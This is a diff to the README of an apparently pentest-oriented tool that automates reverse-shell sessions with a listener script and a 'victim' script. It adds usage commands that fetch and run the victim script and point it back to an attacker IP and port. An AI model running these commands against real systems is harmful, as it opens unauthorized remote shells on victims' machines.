@@ -6,8 +6,8 @@ Version 1
 ## Purpose
 
 Automation tool for listening and starting shells sessions.\
-Both, the listener and the victim scripts check for already installed applications.\
-This tool makes it very easy to try many ways lots of ways to get a shell by selecting numbers from a menu.
+Both, the listener and the victim scripts check for installed resources.\
+This tool simplifies the successive trials of starting a shell by selecting options from a menu.
 
 ## Quick Execution
 
@@ -32,23 +32,28 @@ wget -q "https://raw.githubusercontent.com/davift/getting-shells/main/victim.sh"
 No installation is required. This scripts can run out of the box. Just clone the repo:
 
 ```
-git clone https://github.com/davift/getting-shells.git
+git clone https://github.com/davift/getting-shells.git && cd getting-shells
 ```
 
 ## Execution
 
 ```
+./listener.sh 443
+```
 
+```
+./victim.sh 192.168.2.1 443
 ```
 
 ## Additionals
 
-There is no such thing as dependencies to run this tool because it uses the available resources in the system to establish the connections.\
-Additionally, the following script will help on installing more resources that will allow exploring all the functionalities of this tool:
+There is no such thing as dependencies to run this tool. It uses the available resources in the system to establish the sessions.\
+Additionally, in case you need more resources and have the necessary privileges on the system, the following script will automate the installation of more resources:
 
 ```
 ./additionals.sh
 ```
+
 ## More Information
 
 Read more at https://blog.dftorres.ca/?p=2224.
